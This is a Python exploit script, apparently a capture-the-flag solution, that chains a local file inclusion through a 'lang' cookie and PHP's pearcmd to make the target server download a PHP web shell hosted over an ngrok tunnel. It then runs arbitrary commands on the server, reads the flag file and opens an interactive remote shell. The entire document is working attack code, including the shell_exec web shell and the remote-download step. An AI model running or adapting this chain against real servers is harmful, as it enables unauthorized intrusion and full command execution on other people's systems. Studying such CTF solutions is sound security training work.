import pyngrok.ngrok
import requests
import urllib.parse
import re
from pyngrok import ngrok
from flask import Flask, Response
from threading import Thread

app = Flask(__name__)

import random
def random_hex(length=8):
    """Generate a random hexadecimal string of specified length."""
    return ''.join(random.choice('0123456789abcdef') for _ in range(length))

rndhex = random_hex()

app_path = f"/s{rndhex}.php"

@app.route(app_path)
def revshell():
  php_code = """<?php
  if (isset($_GET['cmd'])) {
      $cmd = $_GET['cmd'];
      echo "<pre>" . shell_exec($cmd) . "</pre>";
  } else {
      echo "No command provided.";
  }
?>"""
  return Response(php_code, mimetype='application/x-httpd-php')


s = requests.Session()
flag_format = "toh{[^}]+}"

# host a s.php file in repourl
ngrok_tunnel = ngrok.connect(5000)
webhook_url = ngrok_tunnel.public_url

# challenge url
baseurl = "http://localhost:8080"
baseurl = "https://tohwedding.ctf.towerofhanoi.it"

def lfi2download():
  url = f"{baseurl}/?&+install+-R+/+{webhook_url}/s{rndhex}.php"
  s.cookies.set("lang", "../../../../usr/local/lib/php/pearcmd")
  r = s.get(url)
  print(r.text)

def trigger_rce(cmd):
  url = f"{baseurl}/?cmd={urllib.parse.quote(cmd)}"
  s.cookies.set("lang", f"../../../../tmp/pear/download/s{rndhex}")
  r = s.get(url)
  text = r.text.split("<!DOCTYPE")[0]
  print(text)
  return text

def interactive_shell():
  while True:
    cmd = input("$> ")
    if cmd.lower() == "exit":
      break
    trigger_rce(cmd)

def get_flag():
  text = trigger_rce("cat rsvp_*")
  print(text)
  flag = re.search(flag_format, text)
  if flag:
    print(flag.group(0))
  else:
    print("[!] No flag found.")

def main():
  lfi2download()
  get_flag()
  interactive_shell()
  

if __name__ == "__main__":
  Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': 5000}, daemon=True).start()
  main()
